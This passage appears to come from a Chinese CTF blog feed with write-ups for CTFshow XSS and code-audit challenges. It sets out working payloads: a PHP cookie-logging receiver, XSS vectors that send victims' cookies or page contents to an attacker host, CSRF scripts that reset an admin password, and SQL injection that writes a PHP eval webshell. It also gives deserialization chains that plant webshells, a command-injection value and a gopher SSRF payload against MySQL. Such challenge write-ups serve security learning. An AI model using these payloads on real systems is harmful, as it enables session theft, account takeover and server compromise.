class="language-php">root@hcss-ecs-8320:~&#x2F;test# python3 exp.py -t http:&#x2F;&#x2F;pwn.challenge.ctf.show:28100&#x2F; -c &#39;shell_exec(&quot;ls &#x2F;&quot;);&#39;Traceback (most recent call last):  File &quot;&#x2F;root&#x2F;test&#x2F;exp.py&quot;, line 65, in &lt;module&gt;    conn, addr &#x3D; sk.accept()  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.10&#x2F;socket.py&quot;, line 293, in accept    fd, addr &#x3D; self._accept()TimeoutError: timed out</code></pre><p>可能是环境出问题了，没有复现成功。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web316-web333XSS篇</title>
      <link href="/posts/d7d45c8a/"/>
      <url>/posts/d7d45c8a/</url>
      
        <content type="html"><![CDATA[<h1 id="提前准备"><a href="#提前准备" class="headerlink" title="提前准备"></a>提前准备</h1><p>准备几个XSS注入网站：<br>如<a href="https://xsshs.cn/%EF%BC%8Chttps://xss.pt/%EF%BC%8Chttp://xsscom.com%E5%8E%BB%E7%94%9F%E6%88%90xss%E9%93%BE%E6%8E%A5">https://xsshs.cn/，https://xss.pt/，http://xsscom.com去生成xss链接</a><br>当然，除此之外，也可以自己编写：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$cookie &#x3D; $_GET[&#39;cookie&#39;];$log &#x3D; fopen(&quot;cookie.txt&quot;, &quot;a&quot;);fwrite($log, $cookie . &quot;\n&quot;);fclose($log);?&gt;</code></pre><h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>后台bot会自动访问你的连接，我们只需要写一段恶意XSS内容即可。<br>这里用<a href="https://xss.pt/">https://xss.pt/</a>进行复现。<br>注册好后，创建项目之后，把获取cookie添加上。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695119320621-77e0dee8-617b-4248-a848-74d42e647038.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695119451635-6630fbfb-343a-44ed-9546-687032cca715.png" alt="image.png"><br>好像抓到的是自己🤔。<br>那就试一试写在自己的VPS上。</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$cookie &#x3D; $_GET[&#39;cookie&#39;];$log &#x3D; fopen(&quot;cookie.txt&quot;, &quot;a&quot;);fwrite($log, $cookie . &quot;\n&quot;);fclose($log);?&gt;</code></pre><p>payload：<code>&lt;script&gt;document.location.href=&quot;http://ip/xss.php?cookie=&quot;+document.cookie&lt;/script&gt;</code><br>传入就可以得到需要的flag了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695124984710-47892421-05e0-4546-83f6-31706a597d5a.png" alt="image.png"></p><h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script，随便换一个标签名称就行了，比如input：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;input onfocus&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;natro92.top&#x2F;xss.php?cookie&#x3D;&#39;+document.cookie)&quot; autofocus&gt;</code></pre><p>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</p><h2 id="其他接入方法"><a href="#其他接入方法" class="headerlink" title="其他接入方法"></a>其他接入方法</h2><p>其他的方法：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;svg onload&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;ip&#x2F;&#39;+document.cookie)&quot;&gt;&lt;iframe onload&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;ip&#x2F;&#39;+document.cookie)&quot;&gt;&lt;&#x2F;iframe&gt;&lt;body onload&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;ip&#x2F;&#39;+document.cookie)&quot;&gt;</code></pre><p>用上面这种方法直接用nc接就行，或者python的服务器。</p><pre class="language-php" data-language="php"><code class="language-php">python3 -m http.server 39543</code></pre><h3 id="注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。"><a href="#注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。" class="headerlink" title="注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。"></a>注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。</h3><p>同理，使用nc也是可以达到效果的：</p><pre class="language-php" data-language="php"><code class="language-php">nc -vlp 8888</code></pre><p>payload也就可以简便为：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;input onfocus&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;xxx&#x2F;&#39;+document.cookie)&quot; autofocus&gt;</code></pre><p>可能慢一点，多刷新。<br>既然如此，dnslog估计也是可以用的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695126147714-c32fc3cd-7d65-48ae-9e80-43ef0c43a361.png" alt="image.png"></p><h1 id="web318-319"><a href="#web318-319" class="headerlink" title="web318-319"></a>web318-319</h1><pre class="language-php" data-language="php"><code class="language-php">&lt;input onfocus&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;xxx&#x2F;&#39;+document.cookie)&quot; autofocus&gt;</code></pre><h1 id="web320-web326"><a href="#web320-web326" class="headerlink" title="web320-web326"></a>web320-web326</h1><h3 id="过滤掉了空格"><a href="#过滤掉了空格" class="headerlink" title="过滤掉了空格"></a>过滤掉了空格</h3><p>绕过方法：</p><ul><li>TAB</li><li>&#x2F;</li><li>&#x2F;**&#x2F;</li></ul><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;input&#x2F;**&#x2F;onfocus&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;xxx&#x2F;&#39;+document.cookie)&quot;&#x2F;**&#x2F;autofocus&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695126464239-47f3ca03-ec5d-4961-9b18-3dc47b1c66a4.png" alt="image.png"></p><h1 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h1><p>存储型XSS，还是用之前payload。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695197738252-7c67bfec-c105-456d-9778-42cf8a5000bd.png" alt="image.png"><br>这里需要给admin发信息，意思大概是获取admin的cookie。</p><h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>有个登录页面，但是登不上去，旁边有个注册，注册的用户管理用户名会被管理员检测到。因此将payload放入用户名中。<br>虽然没有flag，但是有cookie，尝试登录一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198046512-23757c3e-2857-4e97-bd9d-c5701b0664ed.png" alt="image.png"><br><code>PHPSESSID=7e8jf9pathne9tvgnb02kvj4h9</code><br>在hackbar中传入的cookie是临时的而且没有删除掉本地的cookie，我们需要写到存储中，并删除掉原有cookie值：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198320206-54b159b1-0fc0-4e57-a6d0-e07eea04be56.png" alt="image.png"><br>然后就能看到cookie了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198380472-3e891c60-8ccc-4786-a7d8-df3e5e448741.png" alt="image.png"></p><h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><p>直接用之前的方法，得到的cookie是前一次的cookie（管理员打开之后立即退出了登录），cookie刷新了，也就失效了。<br>那直接写段js，使其执行时获取到页面的其他显示密码即可（因为管理员页面是显示密码的。）。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">document.querySelectorAll(&#39;.laytable-cell-1-0-1&#39;).forEach(cell &#x3D;&gt; &#123;  if (cell.textContent.startsWith(&#39;ctfshow&#123;&#39;)) &#123;    console.log(cell.textContent);     window.open(&#39;http:&#x2F;&#x2F;xxx:8888&#x2F;&#39;+cell.textContent)  &#125;&#125;);</code></pre><p>这时候我们注册测试一下。<br>为什么会没接到呢。<br>试一试wp的写法：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;    if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#39;)&gt;-1)&#123;        window.location.href&#x3D;&#39;http:&#x2F;&#x2F;ip&#x2F;a.php?cookie&#x3D;&#39;+value.innerHTML;     &#125;&#125;);&lt;&#x2F;script&gt;</code></pre><p>怪了，这种就可以传上去：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695199660892-dbce885c-b380-4a11-8983-c83e0530ab79.png" alt="image.png"><br>这里面有文本干扰，所以在末尾添加一个<code>&#123;</code>来定向获取flag。<br>也就是：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;    if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#123;&#39;)&gt;-1)&#123;        window.location.href&#x3D;&#39;http:&#x2F;&#x2F;xxx:8888&#x2F;&#39;+value.innerHTML;     &#125;&#125;);&lt;&#x2F;script&gt;</code></pre><p>这时就能得到flag了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695199955395-f485bb4c-bc69-4c16-b8bf-06f06312e8b5.png" alt="image.png"></p><h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><p>多了一个修改密码，直接让管理员修改密码即可。查看访问格式：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200054149-497ab670-7c16-4715-b514-55c39f4d48c6.png" alt="image.png"></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;api&#x2F;change.php?p&#x3D;admin&#39;;&lt;&#x2F;script&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200186447-11c87ee9-ae07-4e41-baba-a650a282c683.png" alt="image.png"><br>注意，当登录之后访问页面之后就会发现会跳转到修改的页面，手速快点复制下来。</p><h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p>与上题类似，但是这里使用的是post：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200377250-37dbc647-5bce-4151-af0a-c34dd3f7936f.png" alt="image.png"><br>修改一下payload即可：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">&lt;script&gt;$.ajax(&#123;url:&#39;api&#x2F;change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;admin&#39;&#125;&#125;);&lt;&#x2F;script&gt;</code></pre><h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p>为什么给admin转-99999就变成正的了，有点摸不到头脑<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200578624-04c33805-ec22-4736-8edf-da295212cbc1.png" alt="image.png"></p><h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><p>自己给自己转可以加钱，什么虚空科技。直接上脚本</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">import requestsx&#x3D;5url&#x3D;&quot;http:&#x2F;&#x2F;e8e0aa13-bff2-4b78-a8cb-f7c0f0e73ae2.challenge.ctf.show&#x2F;api&#x2F;amount.php&quot;url2&#x3D;&quot;http:&#x2F;&#x2F;e8e0aa13-bff2-4b78-a8cb-f7c0f0e73ae2.challenge.ctf.show&#x2F;api&#x2F;getFlag.php&quot;headers&#x3D;&#123;&#39;Cookie&#39;:&#39;PHPSESSID&#x3D;jkvcavn3fpfel2opl4afqdcepp&#39;&#125;  #自己登录后的sessionidwhile True:print(x)t&#x3D;x-1data&#x3D;&#123;&#39;u&#39;:&#39;user&#39;, #注册的用户名&#39;a&#39;:str(t)&#125;r&#x3D;requests.post(url,headers&#x3D;headers,data&#x3D;data)print(r.text)if(x&gt;10000):r2&#x3D;requests.get(url2,headers&#x3D;headers)print(r2.text)breakx+&#x3D;t</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695201085660-c75cae90-a34e-4f7c-9dbd-1dcf457ecd52.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web301-web310代码审计</title>
      <link href="/posts/fc839fed/"/>
      <url>/posts/fc839fed/</url>
      
        <content type="html"><![CDATA[<h1 id="web301-302"><a href="#web301-302" class="headerlink" title="web301-302"></a>web301-302</h1><p>上来就是登录页面，看了代码发现没有过滤，尝试使用sqlmap直接开注入。</p><pre class="language-none"><code class="language-none">$sql&#x3D;&quot;select sds_password from sds_user where sds_username&#x3D;&#39;&quot;.$username.&quot;&#39; order by id limit 1;&quot;;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692710578502-cd8b5cd9-289d-4d3a-9320-2ac09591e7d5.png" alt="image.png"></p><pre class="language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;e870d81c-dd88-4dc4-b990-760221d286bb.challenge.ctf.show&#x2F;checklogin.php --data &#39;userid&#x3D;1&amp;userpwd&#x3D;1&#39; -D sds -C sds_password --dump --batch</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692712050115-fbdbfe16-279c-4760-924d-8f3686d25747.png" alt="image.png"><br>看看密码，sqlmap这个必须盲注，只盲了密码，猜账号为admin。<br>登陆成功。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692712078604-99fbc469-4f7b-41d5-9bce-b007a63bbaa8.png" alt="image.png"><br>但是登录进入之后没啥用，似乎得写入shell。<br>之前还真没怎么用过sql写文件，这里记一下：</p><pre class="language-none"><code class="language-none">userid&#x3D;1&#39;+union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php&quot;--+&amp;userpwd&#x3D;1</code></pre><p>然后直接rce即可。</p><h1 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h1><p>这回写不进去了，返回了一串字符。继续读代码。<br>账号估计还是<code>admin</code>，但是sqlmap进不去了，那就尝试爆破一下，真进去了还，密码就是admin。（在sql文件中有登录密码的md5的值，可以去找破解）<br>dptadd.php中有更新语句。</p><pre class="language-none"><code class="language-none">$sql&#x3D;&quot;insert into sds_dpt set sds_name&#x3D;&#39;&quot;.$dpt_name.&quot;&#39;,sds_address &#x3D;&#39;&quot;.$dpt_address.&quot;&#39;,sds_build_date&#x3D;&#39;&quot;.$dpt_build_year.&quot;&#39;,sds_have_safe_card&#x3D;&#39;&quot;.$dpt_has_cert.&quot;&#39;,sds_safe_card_num&#x3D;&#39;&quot;.$dpt_cert_number.&quot;&#39;,sds_telephone&#x3D;&#39;&quot;.$dpt_telephone_number.&quot;&#39;;&quot;;</code></pre><p>在dpt_name里面插入语句。<br>post：</p><pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;,sds_address &#x3D;(select 1)#</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692715850916-55750a4a-3948-4e0d-bb90-00b79ec1eae4.png" alt="image.png"><br>依次查询即可。</p><pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;,sds_address &#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#</code></pre><blockquote><p>sds_dpt,sds_fl9g,sds_user</p></blockquote><pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;,sds_address &#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;sds_fl9g&quot;)#</code></pre><blockquote><p>flag</p></blockquote><pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;,sds_address &#x3D;(select flag from sds_fl9g)#</code></pre><h1 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h1><p>有了waf</p><pre class="language-none"><code class="language-none">function sds_waf($str)&#123;return preg_match(&#39;&#x2F;[0-9]|[a-z]|-&#x2F;i&#39;, $str);&#125;</code></pre><p>但是似乎上面的payload也是可以的。</p><pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;, sds_address&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())--+</code></pre><pre class="language-none"><code class="language-none">dpt_name&#x3D;1&#39;, sds_address&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;sds_flaag&quot;)--+</code></pre><h1 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h1><p>密码还是相同的，先看一眼waf：</p><pre class="language-php" data-language="php"><code class="language-php">function sds_waf($str)&#123;  if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\&#x3D;|\&#123;|\&#125;|\[|\]|\;|\:|\&#39;|\&quot;|\,|\.|\?|\&#x2F;|\\\|\&lt;|\&gt;&#x2F;&#39;, $str))&#123;    return false;  &#125;else&#123;    return true;  &#125;&#125;</code></pre><p>注入感觉不太行，换个思路。<br>class.php里面似乎有反序列化漏洞。</p><pre class="language-php" data-language="php"><code class="language-php">class user&#123;public $username;public $password;public function __construct($u,$p)&#123;$this-&gt;username&#x3D;$u;$this-&gt;password&#x3D;$p;&#125;public function __destruct()&#123;file_put_contents($this-&gt;username, $this-&gt;password);&#125;&#125;</code></pre><p>再找他的注入点：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692776440370-d18b7389-60e4-4c78-a4c1-c9fdbfc084a3.png" alt="image.png"><br>在checklogin.php里面，那我们直接写一个shell进去。这里需要url编码。</p><pre class="language-php" data-language="php"><code class="language-php">$a &#x3D; new user(&#39;1.php&#39;,&#39;&lt;?php eval($_GET[1]);?&gt;&#39;);echo urlencode(serialize($a));</code></pre><p>加入到cookie里面。</p><pre class="language-php" data-language="php"><code class="language-php">user&#x3D;O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A23%3A%22%3C%3Fphp+eval%28%24_GET%5B1%5D%29%3B%3F%3E%22%3B%7D</code></pre><p>写了shell之后发现里面没有flag文件，那估计就是在数据库中。<br>用蚁剑连接数据库，密码是root，弱口令。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692780896651-ce25991e-b502-4cb3-bb5b-ca641e6b0557.png" alt="image.png"></p><h1 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h1><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><p>还是反序列化</p><pre class="language-php" data-language="php"><code class="language-php">class log&#123;public $title&#x3D;&#39;log.txt&#39;;public $info&#x3D;&#39;&#39;;public function loginfo($info)&#123;$this-&gt;info&#x3D;$this-&gt;info.$info;&#125;public function close()&#123;file_put_contents($this-&gt;title, $this-&gt;info);&#125;&#125;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692783099271-9c0ed153-1fea-4ee8-995b-57a3c3dc502e.png" alt="image.png"><br>查询之后发现有一个调用close方法的位置。</p><pre class="language-php" data-language="php"><code class="language-php">class dao&#123;private $config;private $conn;public function __destruct()&#123;$this-&gt;conn-&gt;close();&#125;</code></pre><p>index里面包含了需要的文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692783481714-0b44c2cf-10f0-4c57-af3b-0e0e162e724d.png" alt="image.png"><br>写一下exp：<br>注意这以下都是错的！！！！</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass dao&#123;    private $config;    &#x2F;&#x2F; 注意private 先改后修吧    public $conn;    public function __destruct()    &#123;        $this-&gt;conn-&gt;close();    &#125;&#125;class log&#123;    public $title&#x3D;&#39;log.txt&#39;;    public $info&#x3D;&#39;&#39;;    public function loginfo($info)&#123;        $this-&gt;info&#x3D;$this-&gt;info.$info;    &#125;    public function close()&#123;        file_put_contents($this-&gt;title, $this-&gt;info);    &#125;&#125;$b &#x3D; new log();$b-&gt;title &#x3D; &#39;1.php&#39;;$b-&gt;info &#x3D; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;;$a &#x3D; new dao();$a-&gt;conn &#x3D; $b;echo urlencode(serialize($a));</code></pre><p>得到：</p><pre class="language-php" data-language="php"><code class="language-php">O%3A3%3A%22dao%22%3A2%3A%7Bs%3A11%3A%22%00dao%00config%22%3BN%3Bs%3A4%3A%22conn%22%3BO%3A3%3A%22log%22%3A2%3A%7Bs%3A5%3A%22title%22%3Bs%3A5%3A%221.php%22%3Bs%3A4%3A%22info%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D%7D修改public为private，并且修改字符个数O%3A3%3A%22dao%22%3A2%3A%7Bs%3A11%3A%22%00dao%00config%22%3BN%3Bs%3A9%3A%22%00dao%00conn%22%3BO%3A3%3A%22log%22%3A2%3A%7Bs%3A5%3A%22title%22%3Bs%3A5%3A%221.php%22%3Bs%3A4%3A%22info%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D%7D再套一层base64</code></pre><p>这以上都是错的<br>妈的 那个base64之前不需要url转义，而且有更好的写法，利用construct构造方法解决：<br>新的exp：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass dao&#123;private $conn;public function __construct()&#123;$this-&gt;conn&#x3D;new log();&#125;&#125;class log&#123;public $title&#x3D;&#39;a.php&#39;;public $info&#x3D;&#39;&lt;?php eval($_POST[1]);?&gt;&#39;;&#125;$a&#x3D;new dao();echo base64_encode(serialize($a));</code></pre><p>擦，卡在了密码这半小时，密码是<code>admin1</code>，仔细读了一下代码，发现多层md5加密，而且有salt，因此应该是弱口令爆破出来。研究了半天hashcat。</p><h1 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h1><p>直接上cnseay，一键审计。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694926443971-a06d0593-19be-4cb4-bf93-27dc36a331f5.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694926518010-4273905e-a413-4f6e-9968-494658b6560c.png" alt="image.png"><br>第二个直接用分号隔断进行命令执行即可。<br>构造一下内容，写个马。</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass config&#123;    public $cache_dir &#x3D; &#39;;echo &quot;&lt;?php system($_POST[1]); ?&gt;&quot; &gt; 1.php;&#39;;&#125;class dao&#123;    private $config;    public function __construct()    &#123;        $this-&gt;config &#x3D; new config();    &#125;&#125;echo base64_encode(serialize(new dao()));</code></pre><pre class="language-php" data-language="php"><code class="language-php">TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDQ6IjtlY2hvICI8P3BocCBzeXN0ZW0oJF9QT1NUWzFdKTsgPz4iID4gMS5waHA7Ijt9fQ</code></pre><p>我们这里激活点用的是：logout下的，因此注意生成马的相对路径前也有个controller<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694927480974-575e9f4d-bcdc-4475-9bcb-da89a43c285a.png" alt="image.png"><br>测了，校园网传不上去payload。直接写入读一下吧。</p><h1 id="web308"><a href="#web308" class="headerlink" title="web308"></a>web308</h1><h3 id="SSRF打mysql"><a href="#SSRF打mysql" class="headerlink" title="SSRF打mysql"></a>SSRF打mysql</h3><blockquote><p><a href="https://blog.csdn.net/qq_42880719/article/details/122510390">https://blog.csdn.net/qq_42880719&#x2F;article&#x2F;details&#x2F;122510390</a></p></blockquote><p>我合计还用原来的写法，前后拼接一下，应该还能用，但是wp用了ssrf。正好没接触过，学一下。</p><blockquote><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p></blockquote><p>通过gopherus生成payload来打mysql<br>利用点在：</p><pre class="language-php" data-language="php"><code class="language-php">function checkUpdate($url)&#123;$ch&#x3D;curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, false);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);$res &#x3D; curl_exec($ch);curl_close($ch);return $res;&#125;</code></pre><pre class="language-php" data-language="php"><code class="language-php">Give MySQL username: rootGive query to execute: select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&quot;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694929570468-2704a7e4-7a92-4c63-bbb9-e5f479587b22.png" alt="image.png"><br>poc：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass config&#123;    public $update_url &#x3D; &#39;gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01&#39;;&#125;class dao&#123;    private $config;    public function __construct()&#123;        $this-&gt;config &#x3D; new config();    &#125;&#125;echo base64_encode(serialize(new dao()));&#x2F;&#x2F;TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjA6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDUlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlMDElMDAlMDAlMDAlMDEiO319</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694930006097-a4bea450-bf23-4cf0-9c25-36c2a0e97031.png" alt="image.png"><br>爆破进去。<br>然后再index.php页面cookie中传入service中传入需要的payload即可。<br>然后访问1.php传参获取flag即可。</p><h1 id="web309"><a href="#web309" class="headerlink" title="web309"></a>web309</h1><h3 id="SSRF打fastcgi"><a href="#SSRF打fastcgi" class="headerlink" title="SSRF打fastcgi"></a>SSRF打fastcgi</h3><p>这根本不会，直接超wp</p><blockquote><p>在静态网站中，WEB 容器如 Apache、Nginx 相当于内容分发员的角色， 根据用户请求的页面从网站根目录中返回给用户；而在动态网站中，WEB 容器例如 Apache 会根据用户的请求进行简单处理后交给 php 解释器；当 Apache 收到用户对 index.php 的请求后，如果使用的是 